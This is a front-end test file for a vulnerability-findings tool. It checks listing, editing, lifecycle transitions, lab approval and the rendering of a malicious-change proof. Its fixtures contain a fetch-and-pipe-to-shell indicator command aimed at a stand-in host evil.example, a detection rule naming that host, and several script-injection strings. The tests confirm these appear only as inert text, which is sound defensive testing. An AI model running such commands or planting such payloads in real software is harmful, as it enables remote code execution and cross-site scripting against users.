import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter, Route, Routes } from "react-router-dom";
import { afterEach, expect, it, vi } from "vitest";
import { FindingDetail, FindingForm, FindingsList } from "./Findings";
import { setCsrfToken } from "../api";

afterEach(() => {
  vi.unstubAllGlobals();
  setCsrfToken(undefined);
});
const application = {
  id: "application",
  asset_name: "Customer portal",
  asset_url: "https://example.test",
  product_kind: "cms",
  product_name: "Example CMS",
  monitor_interval_seconds: 604800,
  monitor_enabled: true,
  archived: false,
  source_generation: 1,
  last_check_at: null,
  next_check_at: null,
  repositories: [],
  version: null,
  config: {},
};
const summary = {
  id: "finding",
  application_id: "application",
  source: "commit",
  source_ref: "abc1234",
  cve_id: null,
  title: "Stored XSS in timezone settings",
  status: "open",
  cause: { by: "operator", at: "2026-10-06T00:00:00Z" },
  deployed_version: "unknown",
  affected_versions: [
    { product: "Example CMS", range: "<= 9.5.3", source: "Pinned source" },
  ],
  fixed_versions: [
    { product: "Example CMS", version: "9.5.4", fix_commit: "a".repeat(40) },
  ],
  target_applicability: "unknown",
  artifact_revision: "revision",
  lab_status: "verified",
  artifact_state: {
    status: "complete",
    missing: [],
    limitations: [],
    vulnerable_version: "9.5.3",
  },
  created_at: "2026-10-06T00:00:00Z",
  updated_at: "2026-10-06T00:00:00Z",
};
const detail = {
  ...summary,
  artifacts: [],
  evidence: [],
  events: [],
  lab_runs: [
    { id: "lab", status: "verified", created_at: "2026-10-06T00:00:00Z" },
  ],
};

it("loads compact summaries, renders structured fixed versions, and paginates", async () => {
  const fetch = vi.fn(async (url: string) => {
    const query = new URL(url, "http://localhost").searchParams;
    const item = query.has("cursor")
      ? {
          ...summary,
          id: "second",
          title: "Path traversal in templates",
          fixed_versions: ["10.0.0"],
          lab_status: null,
        }
      : summary;
    return new Response(
      JSON.stringify({
        items: [item],
        next_cursor: query.has("cursor") ? null : "1",
      }),
    );
  });
  vi.stubGlobal("fetch", fetch);
  render(
    <MemoryRouter>
      <FindingsList />
    </MemoryRouter>,
  );
  expect(
    await screen.findByRole("link", { name: summary.title }),
  ).toHaveAttribute("href", "/findings/finding");
  expect(screen.getByText("Example CMS 9.5.4")).toBeInTheDocument();
  expect(screen.getByText("Lab verified")).toBeInTheDocument();
  expect(
    new URL(fetch.mock.calls[0][0], "http://localhost").searchParams.get(
      "view",
    ),
  ).toBe("summary");
  await userEvent.setup().click(screen.getByRole("button", { name: /next/i }));
  expect(
    await screen.findByRole("link", { name: "Path traversal in templates" }),
  ).toBeInTheDocument();
  expect(screen.getByText("10.0.0")).toBeInTheDocument();
  expect(screen.getByText("Lab unverified")).toBeInTheDocument();
  expect(screen.queryByText(/unexpected response/i)).not.toBeInTheDocument();
});

it("renders structured ranges in the finding detail", async () => {
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async (url: string) =>
        new Response(
          JSON.stringify(
            url.startsWith("/api/applications/") ? application : detail,
          ),
        ),
    ),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  expect(
    await screen.findByRole("heading", { name: summary.title }),
  ).toBeInTheDocument();
  expect(screen.getByText("Example CMS <= 9.5.3")).toBeInTheDocument();
  expect(screen.getByText("Example CMS 9.5.4")).toBeInTheDocument();
});

it("preserves structured version evidence and leaves the lifecycle alone when editing", async () => {
  let saved: Record<string, unknown> | undefined;
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (init?.method === "PATCH") {
        saved = JSON.parse(String(init.body));
        return new Response(JSON.stringify({ ...detail, ...saved }));
      }
      return new Response(
        JSON.stringify(
          url === "/api/applications"
            ? { items: [application], next_cursor: null }
            : detail,
        ),
      );
    }),
  );
  setCsrfToken("fixture-csrf");
  render(
    <MemoryRouter initialEntries={["/findings/finding/edit"]}>
      <Routes>
        <Route path="/findings/:id/edit" element={<FindingForm />} />
        <Route path="/findings/:id" element={<h1>Saved finding</h1>} />
      </Routes>
    </MemoryRouter>,
  );
  const user = userEvent.setup();
  const title = await screen.findByLabelText("Title");
  await user.clear(title);
  await user.type(title, "Reviewed title");
  expect(screen.getByLabelText("Source")).toBeDisabled();
  expect(screen.getByLabelText("Affected versions (one per line)")).toHaveValue(
    "Example CMS <= 9.5.3",
  );
  await user.click(screen.getByRole("button", { name: "Save finding" }));
  expect(
    await screen.findByRole("heading", { name: "Saved finding" }),
  ).toBeInTheDocument();
  expect(saved?.title).toBe("Reviewed title");
  expect(saved?.source).toBe("commit");
  expect(saved).not.toHaveProperty("status");
  expect(saved?.affected_versions).toEqual(summary.affected_versions);
  expect(saved?.fixed_versions).toEqual(summary.fixed_versions);
});

it("deletes a false-positive finding after confirmation and returns to its commit", async () => {
  const requests: [string, string][] = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      requests.push([init?.method || "GET", url]);
      if (init?.method === "DELETE") return new Response(null, { status: 204 });
      return new Response(
        JSON.stringify(
          url.startsWith("/api/applications/")
            ? application
            : { ...detail, source_commit_id: "commit-1" },
        ),
      );
    }),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
        <Route path="/commits/:id" element={<p>Commit page</p>} />
      </Routes>
    </MemoryRouter>,
  );
  const user = userEvent.setup();
  await user.click(
    await screen.findByRole("button", { name: "Delete finding" }),
  );
  // The first click only arms the action.
  expect(requests.some(([method]) => method === "DELETE")).toBe(false);
  await user.click(screen.getByRole("button", { name: "Delete permanently?" }));
  expect(await screen.findByText("Commit page")).toBeInTheDocument();
  expect(requests).toContainEqual(["DELETE", "/api/findings/finding"]);
});

it("opens a finding recorded before version ranges were stored for commit findings", async () => {
  // Stored before commit findings carried version ranges: both lists are absent.
  const legacy: Record<string, unknown> = {
    ...detail,
    source_commit_id: "commit-1",
  };
  delete legacy.affected_versions;
  delete legacy.fixed_versions;
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async (url: string) =>
        new Response(
          JSON.stringify(
            url.startsWith("/api/applications/") ? application : legacy,
          ),
        ),
    ),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  expect(
    await screen.findByRole("heading", { name: summary.title }),
  ).toBeInTheDocument();
  expect(screen.queryByRole("alert")).not.toBeInTheDocument();
});

it("deletes the selected findings together after confirmation", async () => {
  let items = [
    summary,
    { ...summary, id: "second", title: "Path traversal in templates" },
  ];
  const deletions: unknown[] = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (url === "/api/findings/delete" && init?.method === "POST") {
        const body = JSON.parse(String(init.body)) as { ids: string[] };
        deletions.push(body);
        items = items.filter((f) => !body.ids.includes(f.id));
        return new Response(JSON.stringify({ deleted: body.ids }));
      }
      return new Response(JSON.stringify({ items, next_cursor: null }));
    }),
  );
  render(
    <MemoryRouter>
      <FindingsList />
    </MemoryRouter>,
  );
  const user = userEvent.setup();
  await user.click(
    await screen.findByRole("checkbox", {
      name: "Select all findings on this page",
    }),
  );
  expect(screen.getByRole("status")).toHaveTextContent("2 selected");
  await user.click(
    screen.getByRole("checkbox", {
      name: "Select Path traversal in templates",
    }),
  );
  expect(screen.getByRole("status")).toHaveTextContent("1 selected");
  await user.click(
    screen.getByRole("checkbox", {
      name: "Select Path traversal in templates",
    }),
  );
  const remove = screen.getByRole("button", { name: "Delete 2 findings" });
  await user.click(remove);
  // The first click only arms the action.
  expect(deletions).toEqual([]);
  await user.click(
    screen.getByRole("button", { name: "Delete 2 findings permanently?" }),
  );
  expect(
    await screen.findByRole("heading", { name: "No findings recorded" }),
  ).toBeInTheDocument();
  expect(deletions).toEqual([{ ids: ["finding", "second"] }]);
});

it("lists each finding with its source, lifecycle state and cause", async () => {
  const items = [
    {
      ...summary,
      cause: {
        by: "verdict",
        verdict: "Vulnerability introduced",
        confidence: "high",
        at: "2026-10-06T00:00:00Z",
      },
    },
    {
      ...summary,
      id: "cve",
      source: "cve",
      source_ref: "CVE-2026-1234",
      cve_id: "CVE-2026-1234",
      title: "Template injection",
      status: "remediated",
      cause: { by: "remediation_pr", at: "2026-10-07T00:00:00Z" },
    },
  ];
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async () => new Response(JSON.stringify({ items, next_cursor: null })),
    ),
  );
  render(
    <MemoryRouter>
      <FindingsList />
    </MemoryRouter>,
  );
  const opened = (
    await screen.findByRole("link", { name: summary.title })
  ).closest("tr")!;
  expect(screen.getByRole("columnheader", { name: "State" })).toBeVisible();
  expect(within(opened).getByText("Commit abc1234")).toBeInTheDocument();
  expect(within(opened).getByText("Open")).toBeInTheDocument();
  expect(
    within(opened).getByText(
      "Vulnerability introduced Verdict, high confidence",
    ),
  ).toBeInTheDocument();
  const remediated = screen
    .getByRole("link", { name: "Template injection" })
    .closest("tr")!;
  expect(within(remediated).getByText("CVE-2026-1234")).toBeInTheDocument();
  expect(within(remediated).getByText("Remediated")).toBeInTheDocument();
  expect(
    within(remediated).getByText("Merged Remediation PR"),
  ).toBeInTheDocument();
});

it("shows the lifecycle, the history of linked changes and the Deployed version separately", async () => {
  const at = "2026-10-06T00:00:00Z";
  const confirmed = {
    ...detail,
    source_commit_id: "commit-1",
    status: "confirmed",
    cause: { by: "operator", reason: "Reproduced by hand", at },
    events: [
      {
        id: "e1",
        created_at: at,
        action: "opened",
        source_ref: "abc1234",
        cause: {
          by: "verdict",
          verdict: "Vulnerability fix",
          confidence: "medium",
          at,
        },
      },
      {
        id: "e2",
        created_at: at,
        action: "linked",
        commit_id: "commit-2",
        revision: "b".repeat(40),
        analysis_id: "analysis-2",
        verdict: "Vulnerability fix",
      },
      {
        id: "e3",
        created_at: at,
        action: "transition",
        from: "open",
        to: "confirmed",
        cause: { by: "operator", reason: "Reproduced by hand", at },
      },
      { id: "e4", created_at: at, action: "artifacts_uploaded" },
    ],
  };
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async (url: string) =>
        new Response(
          JSON.stringify(
            url.startsWith("/api/applications/") ? application : confirmed,
          ),
        ),
    ),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  const lifecycle = await screen.findByRole("region", { name: "Lifecycle" });
  expect(within(lifecycle).getByText("Confirmed")).toBeInTheDocument();
  expect(
    within(lifecycle).getByText("Operator: Reproduced by hand"),
  ).toBeInTheDocument();
  const history = screen.getByRole("region", { name: "History" });
  const [opened, linked, transition, uploaded] =
    within(history).getAllByRole("listitem");
  expect(opened).toHaveTextContent("Opened");
  expect(opened).toHaveTextContent("Commit abc1234");
  expect(opened).toHaveTextContent(
    "Vulnerability fix Verdict, medium confidence",
  );
  expect(linked).toHaveTextContent("Vulnerability fix");
  expect(within(linked).getByRole("link", { name: "bbbbbbb" })).toHaveAttribute(
    "href",
    "/commits/commit-2",
  );
  expect(transition).toHaveTextContent("Open → Confirmed");
  expect(transition).toHaveTextContent("Operator: Reproduced by hand");
  expect(uploaded).toHaveTextContent("Artifacts uploaded");
  const deployed = screen.getByText("Deployed version").closest("div")!;
  expect(deployed).toHaveTextContent("Unknown");
  expect(
    screen.getByText(
      "A fix in the repository does not mean the Asset serves it.",
    ),
  ).toBeInTheDocument();
  expect(screen.queryByText("Operator status")).not.toBeInTheDocument();
});

it("confirms, dismisses and marks a finding remediated with a reason", async () => {
  let current: Record<string, unknown> = { ...detail };
  const posted: { body: unknown; csrf: string | null }[] = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (url.startsWith("/api/applications/"))
        return new Response(JSON.stringify(application));
      if (url === "/api/findings/finding/transitions") {
        const body = JSON.parse(String(init?.body)) as {
          state: string;
          reason: string;
        };
        posted.push({
          body,
          csrf: new Headers(init?.headers).get("X-CSRF-Token"),
        });
        current = {
          ...current,
          status: body.state,
          cause: { by: "operator", reason: body.reason },
        };
      }
      return new Response(JSON.stringify(current));
    }),
  );
  setCsrfToken("token");
  const view = () =>
    render(
      <MemoryRouter initialEntries={["/findings/finding"]}>
        <Routes>
          <Route path="/findings/:id" element={<FindingDetail />} />
        </Routes>
      </MemoryRouter>,
    );
  const user = userEvent.setup();
  const enabled = async (reason: string) => {
    const lifecycle = await screen.findByRole("region", { name: "Lifecycle" });
    await user.type(within(lifecycle).getByLabelText("Reason"), reason);
    return ["Confirm", "Dismiss", "Mark remediated"].filter(
      (name) =>
        !within(lifecycle)
          .getByRole("button", { name })
          .hasAttribute("disabled"),
    );
  };
  const { unmount } = view();
  const lifecycle = await screen.findByRole("region", { name: "Lifecycle" });
  // An empty reason blocks every action.
  for (const name of ["Confirm", "Dismiss", "Mark remediated"])
    expect(within(lifecycle).getByRole("button", { name })).toBeDisabled();
  expect(await enabled("Reproduced in the lab")).toEqual([
    "Confirm",
    "Dismiss",
    "Mark remediated",
  ]);
  await user.click(within(lifecycle).getByRole("button", { name: "Confirm" }));
  expect(await within(lifecycle).findByText("Confirmed")).toBeInTheDocument();
  expect(posted).toEqual([
    {
      body: { state: "confirmed", reason: "Reproduced in the lab" },
      csrf: "token",
    },
  ]);
  expect(await enabled("Patched upstream")).toEqual(["Mark remediated"]);
  await user.click(
    within(lifecycle).getByRole("button", { name: "Mark remediated" }),
  );
  expect(await within(lifecycle).findByText("Remediated")).toBeInTheDocument();
  expect(posted[1].body).toEqual({
    state: "remediated",
    reason: "Patched upstream",
  });
  unmount();
  current = { ...detail };
  view();
  await enabled("Not reachable");
  await user.click(
    within(await screen.findByRole("region", { name: "Lifecycle" })).getByRole(
      "button",
      { name: "Dismiss" },
    ),
  );
  expect(
    await within(screen.getByRole("region", { name: "Lifecycle" })).findByText(
      "Dismissed",
    ),
  ).toBeInTheDocument();
  expect(posted[2].body).toEqual({
    state: "dismissed",
    reason: "Not reachable",
  });
  expect(await enabled("Reopen")).toEqual([]);
});

it("starting a Lab asks for the Operator's password", async () => {
  const posted: { body: unknown; key: string | null }[] = [];
  vi.stubGlobal(
    "fetch",
    vi.fn(async (url: string, init?: RequestInit) => {
      if (url.startsWith("/api/applications/"))
        return new Response(JSON.stringify(application));
      if (url === "/api/findings/finding/lab-runs") {
        posted.push({
          body: JSON.parse(String(init?.body)),
          key: new Headers(init?.headers).get("Idempotency-Key"),
        });
        return posted.length === 1
          ? new Response(
              JSON.stringify({
                code: "approval_refused",
                message: "The password is incorrect; nothing was approved",
              }),
              { status: 403 },
            )
          : new Response(
              JSON.stringify({
                job_id: "job-lab",
                status_url: "/api/jobs/job-lab",
              }),
              { status: 202 },
            );
      }
      return new Response(
        JSON.stringify({
          ...detail,
          events: [
            {
              id: "approved",
              action: "approved",
              approved: "lab_run",
              job_id: "job-lab",
              created_at: "2026-10-06T00:00:00Z",
            },
          ],
          lab_runs: [
            {
              id: "lab",
              status: "not_reproduced",
              created_at: "2026-10-06T00:00:00Z",
            },
          ],
        }),
      );
    }),
  );
  render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
  expect(await screen.findByText("Lab not reproduced")).toBeInTheDocument();
  expect(screen.getByText("Not reproduced")).toBeInTheDocument();
  expect(screen.getByText("Approved · Lab")).toBeInTheDocument();
  const user = userEvent.setup();
  await user.click(screen.getByRole("button", { name: "Start Lab" }));
  const dialog = await screen.findByRole("dialog");
  const password = within(dialog).getByLabelText("Password");
  expect(password).toHaveAttribute("type", "password");
  await user.type(password, "wrong-password");
  await user.click(within(dialog).getByRole("button", { name: "Approve" }));
  expect(
    await within(dialog).findByText(
      "The password is incorrect; nothing was approved",
    ),
  ).toBeInTheDocument();
  expect(screen.getByRole("dialog")).toBeInTheDocument();
  await user.clear(password);
  await user.type(password, "test-password-long");
  await user.click(within(dialog).getByRole("button", { name: "Approve" }));
  await vi.waitFor(() =>
    expect(screen.queryByRole("dialog")).not.toBeInTheDocument(),
  );
  expect(posted.map((p) => p.body)).toEqual([
    { password: "wrong-password" },
    { password: "test-password-long" },
  ]);
  expect(posted.every((p) => p.key)).toBe(true);
});

// A Malicious change's static Proof (A07): T1's postinstall fixture, as the backend stores it.
const at = "2026-11-01T00:00:00Z";
const rule =
  'rule postinstall_loader { strings: $a = "payload-ran" $b = "evil.example/x" condition: all of them } // <script>alert("rule")</script>';
const malicious = {
  ...detail,
  title: "Postinstall loader in package.json",
  source_commit_id: "commit-1",
  status: "confirmed",
  cause: { by: "detection_rule", artifact_revision: "revision", at },
  malicious_change: true,
  lab_runs: [],
  artifact_state: {
    status: "complete",
    missing: [],
    limitations: [],
    vulnerable_version: null,
  },
  static_proof: {
    analysis_id: "analysis-1",
    artifact_revision: "revision",
    files: ["detection-rule.yar", "indicators.json", "report.md"],
    rule,
    status: "validated",
    job_id: "job-rule",
    checks: [
      {
        name: "rule",
        status: "passed",
        message: "The Detection rule compiles",
      },
      {
        name: "changed",
        status: "passed",
        message:
          "The Detection rule matches files this commit added or changed",
        files: ["package.json"],
        count: 1,
      },
      {
        name: "parent",
        status: "passed",
        message: "The Detection rule matches no file in the parent tree",
        files: [],
        count: 0,
      },
      {
        name: "baseline",
        status: "passed",
        message: "The Detection rule matches no file in the Baseline tree",
        files: [],
        count: 0,
      },
    ],
    indicators: {
      files: [{ path: "package.json", sha256: "c".repeat(64) }],
      hosts: ["evil.example"],
      urls: ["https://evil.example/x?<script>alert(1)</script>"],
      commands: ["curl -s https://evil.example/x | sh"],
      rejected: [
        {
          kind: "host",
          value: "cdn.shop.example",
          reason: "Not in the lines this commit added",
        },
      ],
    },
  },
  cleanup_report: {
    analysis_id: "analysis-1",
    commits: [
      { revision: "a".repeat(40), commit_id: "commit-1" },
      { revision: "b".repeat(40), commit_id: null },
    ],
    commits_truncated: true,
    releases: ["v1.0.1"],
    secrets: ["The npm publish token in CI"],
  },
};
function showFinding(finding: Record<string, unknown>) {
  vi.stubGlobal(
    "fetch",
    vi.fn(
      async (url: string) =>
        new Response(
          JSON.stringify(
            url.startsWith("/api/applications/") ? application : finding,
          ),
        ),
    ),
  );
  return render(
    <MemoryRouter initialEntries={["/findings/finding"]}>
      <Routes>
        <Route path="/findings/:id" element={<FindingDetail />} />
      </Routes>
    </MemoryRouter>,
  );
}

it("shows the static Proof with each validation check and the cleanup report as text", async () => {
  const { container } = showFinding(malicious);
  const proof = await screen.findByRole("region", { name: "Static Proof" });
  expect(within(proof).getByText("Validated")).toBeInTheDocument();
  expect(within(proof).getByRole("link", { name: /View job/ })).toHaveAttribute(
    "href",
    "/jobs/job-rule",
  );
  for (const label of [
    "Rule compiles",
    "Matches a file the commit changed",
    "Matches nothing in the parent tree",
    "Matches nothing in the Baseline",
  ])
    expect(within(proof).getByText(label).closest("div")).toHaveTextContent(
      "Passed",
    );
  expect(
    within(proof).getByText("Matches a file the commit changed").closest("div"),
  ).toHaveTextContent("package.json");
  // The rule and every indicator are text: nothing in them is ever markup.
  expect(within(proof).getByText(rule).tagName).toBe("PRE");
  expect(within(proof).getByText("c".repeat(64))).toBeInTheDocument();
  expect(within(proof).getByText("evil.example")).toBeInTheDocument();
  expect(
    within(proof).getByText("https://evil.example/x?<script>alert(1)</script>"),
  ).toBeInTheDocument();
  expect(
    within(proof).getByText("curl -s https://evil.example/x | sh"),
  ).toBeInTheDocument();
  expect(
    within(proof)
      .getByText(/cdn\.shop\.example/)
      .closest("li"),
  ).toHaveTextContent("Not in the lines this commit added");
  expect(container.querySelector("script")).toBeNull();

  const report = screen.getByRole("region", { name: "Cleanup report" });
  expect(within(report).getByText("package.json")).toBeInTheDocument();
  expect(
    within(report).getByText(
      "https://evil.example/x?<script>alert(1)</script>",
    ),
  ).toBeInTheDocument();
  expect(within(report).getByRole("link", { name: "aaaaaaa" })).toHaveAttribute(
    "href",
    "/commits/commit-1",
  );
  expect(within(report).getByText("bbbbbbb")).toBeInTheDocument();
  expect(within(report).getByText(/and more/)).toBeInTheDocument();
  expect(within(report).getByText("v1.0.1")).toBeInTheDocument();
  expect(
    within(report).getByText("The npm publish token in CI"),
  ).toBeInTheDocument();
  expect(
    within(report)
      .getByText("Detection rule to run on the server")
      .closest("div"),
  ).toHaveTextContent("Validated");
  expect(
    within(screen.getByRole("region", { name: "Lifecycle" })).getByText(
      "Validated Detection rule",
    ),
  ).toBeInTheDocument();
});

it("names the failed Detection rule check and keeps the artifacts Draft", async () => {
  showFinding({
    ...malicious,
    status: "open",
    cause: {
      by: "verdict",
      verdict: "Malicious change",
      confidence: "high",
      at,
    },
    artifact_state: {
      status: "draft",
      missing: [],
      limitations: ["The Detection rule also matches files in the parent tree"],
      vulnerable_version: null,
    },
    static_proof: {
      ...malicious.static_proof,
      status: "failed",
      checks: [
        malicious.static_proof.checks[0],
        malicious.static_proof.checks[1],
        {
          name: "parent",
          status: "failed",
          message: "The Detection rule also matches files in the parent tree",
          files: ["server.js"],
          count: 1,
        },
        {
          name: "baseline",
          status: "skipped",
          message: "A Backfill commit is checked against its parent tree only",
        },
      ],
    },
    cleanup_report: { ...malicious.cleanup_report, releases: null },
  });
  const proof = await screen.findByRole("region", { name: "Static Proof" });
  const parent = within(proof)
    .getByText("Matches nothing in the parent tree")
    .closest("div")!;
  expect(parent).toHaveTextContent("Failed");
  expect(parent).toHaveTextContent(
    "The Detection rule also matches files in the parent tree",
  );
  expect(within(parent).getByText("server.js")).toBeInTheDocument();
  expect(
    within(proof).getByText("Matches nothing in the Baseline").closest("div"),
  ).toHaveTextContent("Skipped");
  expect(screen.getByText("Artifacts").closest("span")).toHaveTextContent(
    "Draft",
  );
  const lifecycle = screen.getByRole("region", { name: "Lifecycle" });
  expect(within(lifecycle).getByText("Open")).toBeInTheDocument();
  expect(
    within(lifecycle).getByText("Malicious change Verdict, high confidence"),
  ).toBeInTheDocument();
  const report = screen.getByRole("region", { name: "Cleanup report" });
  expect(within(report).getByText("Releases").closest("div")).toHaveTextContent(
    "Unknown",
  );
});

it("says when no release tag contains the change", async () => {
  showFinding({
    ...malicious,
    cleanup_report: { ...malicious.cleanup_report, releases: [] },
  });
  const report = await screen.findByRole("region", { name: "Cleanup report" });
  expect(within(report).getByText("Releases").closest("div")).toHaveTextContent(
    "No release tag contains it",
  );
});

it("shows the served content sweep matches and a served cleanup report", async () => {
  const { unmount } = showFinding({
    ...malicious,
    source: "served_content",
    source_ref: "https://shop.test",
    source_commit_id: null,
    subject_id: "change-1",
    playbook: [
      { step: "static_proof", status: "validated" },
      { step: "detection_rule", status: "validated" },
      { step: "cleanup_report", status: "ready" },
    ],
    cleanup_report: {
      analysis_id: "analysis-1",
      page_url: "https://shop.test",
      user_agent: "googlebot",
      fetch_ids: ["fetch-1", "fetch-2"],
      first_seen: at,
      secrets: [],
    },
  });
  // A served-content Finding's cleanup report names the page and user agent, not commits.
  const report = await screen.findByRole("region", { name: "Cleanup report" });
  const row = (label: string) => within(report).getByText(label).closest("div");
  expect(row("Served at")).toHaveTextContent("https://shop.test · Googlebot");
  expect(row("Fetches that served it")).toHaveTextContent("2");
  expect(within(report).queryByText("Commits that contained it")).toBeNull();
  expect(within(report).queryByText("Releases")).toBeNull();
  const proof = screen.getByRole("region", { name: "Static Proof" });
  expect(
    within(proof).getByText("Matches nothing in the previous fetch"),
  ).toBeInTheDocument();
  expect(
    screen.queryByRole("region", { name: "Detection rule sweep of served content" }),
  ).toBeNull();
  unmount();

  // An exposed Upstream Malicious change's rule swept over the stored served content (A06).
  const markup = "<script>alert('served')</script>";
  const { container } = showFinding({
    ...malicious,
    playbook: [{ step: "served_content_sweep", status: "matched" }],
    served_content_sweep: {
      artifact_revision: "revision",
      job_id: "job-sweep",
      status: "matched",
      count: 1,
      truncated: true,
      matches: [
        {
          page_id: "page-1",
          page_url: `https://shop.test/${markup}`,
          user_agent: "googlebot",
          fetch_id: "fetch-1",
          url: "https://cdn.shop.test/loader.js",
          sha256: "f".repeat(64),
          fetched_at: at,
        },
      ],
    },
  });
  const playbook = await screen.findByRole("region", { name: "Playbook" });
  expect(
    within(playbook).getByText("Detection rule sweep of served content")
      .nextElementSibling,
  ).toHaveTextContent("Matched stored served content");
  const sweep = screen.getByRole("region", {
    name: "Detection rule sweep of served content",
  });
  const [match] = within(sweep).getAllByRole("row").slice(1);
  expect(match).toHaveTextContent(`https://shop.test/${markup}`);
  expect(match).toHaveTextContent("Googlebot");
  expect(match).toHaveTextContent("https://cdn.shop.test/loader.js");
  expect(match).toHaveTextContent("ffffffffffff");
  expect(within(match).queryByRole("link")).toBeNull();
  expect(sweep).toHaveTextContent("more stored files than one sweep reads");
  expect(
    within(sweep).getByRole("link", { name: /View job/ }),
  ).toHaveAttribute("href", "/jobs/job-sweep");
  expect(container.querySelector("script")).toBeNull();
});

it("offers no Lab and no generation for a Malicious change Finding", async () => {
  const { unmount } = showFinding({
    ...malicious,
    artifact_state: {
      status: "draft",
      missing: ["detection-rule.yar"],
      limitations: [],
      vulnerable_version: null,
    },
  });
  expect(
    await screen.findByText(
      "Missing: detection-rule.yar. The static Proof is complete once its Detection rule validates.",
    ),
  ).toBeInTheDocument();
  expect(
    screen.queryByRole("button", { name: "Start Lab" }),
  ).not.toBeInTheDocument();
  expect(screen.queryByRole("region", { name: "Lab" })).not.toBeInTheDocument();
  expect(screen.queryByText(/^Lab /)).not.toBeInTheDocument();
  expect(
    screen.queryByRole("button", { name: "Generate" }),
  ).not.toBeInTheDocument();
  const user = userEvent.setup();
  await user.click(
    screen.getByRole("button", { name: "Upload missing files" }),
  );
  const dialog = await screen.findByRole("dialog");
  expect(
    within(dialog).getByLabelText("Detection rule (detection-rule.yar)"),
  ).toBeInTheDocument();
  expect(
    within(dialog).queryByLabelText("Python PoC (poc.py)"),
  ).not.toBeInTheDocument();
  unmount();
  showFinding({
    ...detail,
    cause: { by: "verdict", verdict: "Vulnerability introduced", at },
  });
  expect(
    await screen.findByRole("button", { name: "Start Lab" }),
  ).toBeInTheDocument();
  expect(screen.getByRole("button", { name: "Generate" })).toBeInTheDocument();
  expect(
    screen.queryByRole("region", { name: "Static Proof" }),
  ).not.toBeInTheDocument();
});

// A06 and A15: an exposed Upstream Vulnerability introduced Finding, whose Lab waits for an
// Approval while its pin draft is ready, and whose Disclosure report is shown for copying only.
const disclosure =
  "# Unchecked module path in index.js\n<script>alert('report')</script>\n";
const upstreamFinding = {
  ...detail,
  source_commit_id: "commit-1",
  cause: { by: "verdict", verdict: "Vulnerability introduced", at },
  lab_runs: [],
  playbook: [
    { step: "proof", status: "waiting_for_approval" },
    { step: "disclosure_report", status: "ready" },
    { step: "remediation_pr", status: "ready" },
  ],
  exposure: {
    application_id: "application",
    application_name: null,
    verdict: "Vulnerability introduced",
    state: "exposed",
    reason: "v1.1.0 contains the commit",
    locked_version: "1.1.0",
    tag: "v1.1.0",
    target: { tag: "v1.0.0", version: "1.0.0" },
  },
  disclosure_report: {
    text: disclosure,
    form_url: "https://github.com/numen/lib/security/advisories/new",
  },
  own_repository: true,
  remediation_actions: ["pin"],
  remediation_prs: [],
};

it("shows the Playbook steps, the Disclosure report as text to copy and the Exposure", async () => {
  const { container, unmount } = showFinding(upstreamFinding);
  const playbook = await screen.findByRole("region", { name: "Playbook" });
  const state = (step: string) =>
    within(playbook).getByText(step, { selector: "dt" }).nextElementSibling;
  expect(state("Proof")).toHaveTextContent("Waiting for your Approval");
  expect(state("Disclosure report")).toHaveTextContent("Ready");
  expect(state("Remediation PR")).toHaveTextContent(
    "Waiting for your Approval",
  );
  // The Disclosure report is text: the markup in it is never rendered.
  const report = screen.getByRole("region", { name: "Disclosure report" });
  expect(report.querySelector("pre")?.textContent).toBe(disclosure);
  expect(container.querySelector("script")).toBeNull();
  expect(report).toHaveTextContent("GarudaNetra never sends it");
  expect(
    within(report).getByRole("button", { name: "Copy the Disclosure report" }),
  ).toBeInTheDocument();
  expect(
    within(report).getByRole("link", { name: /Open the reporting form/ }),
  ).toHaveAttribute(
    "href",
    "https://github.com/numen/lib/security/advisories/new",
  );
  const exposure = screen.getByRole("region", {
    name: "Remote target exposure",
  });
  expect(
    within(exposure).getByText("Exposure", { selector: "dt" })
      .nextElementSibling,
  ).toHaveTextContent("Exposed v1.1.0 contains the commit");
  expect(within(exposure).getByText("1.1.0 (tag v1.1.0)")).toBeInTheDocument();
  expect(screen.getByRole("button", { name: "Start Lab" })).toBeEnabled();
  unmount();
  // A bump that waits for a release, and a step skipped without an Own repository.
  showFinding({
    ...upstreamFinding,
    cause: { by: "verdict", verdict: "Vulnerability fix", at },
    playbook: [
      { step: "proof", status: "verified" },
      { step: "remediation_pr", status: "waiting_for_release" },
    ],
    disclosure_report: null,
    remediation_actions: [],
  });
  const panel = await screen.findByRole("region", { name: "Remediation PRs" });
  expect(
    within(panel).getByText("Waiting for a release that contains the fix"),
  ).toBeInTheDocument();
  expect(
    screen.queryByRole("region", { name: "Disclosure report" }),
  ).not.toBeInTheDocument();
});

it("offers no Lab for an Own-repository Vulnerability fix and skips Upstream steps without an Own repository", async () => {
  const { unmount } = showFinding({
    ...detail,
    cause: { by: "verdict", verdict: "Vulnerability fix", at },
    playbook: [
      { step: "report", status: "ready" },
      { step: "deployed_version_check", status: "unknown" },
    ],
    own_repository: true,
  });
  const playbook = await screen.findByRole("region", { name: "Playbook" });
  expect(
    within(playbook).getByText("Deployed version check"),
  ).toBeInTheDocument();
  expect(screen.queryByRole("region", { name: "Lab" })).not.toBeInTheDocument();
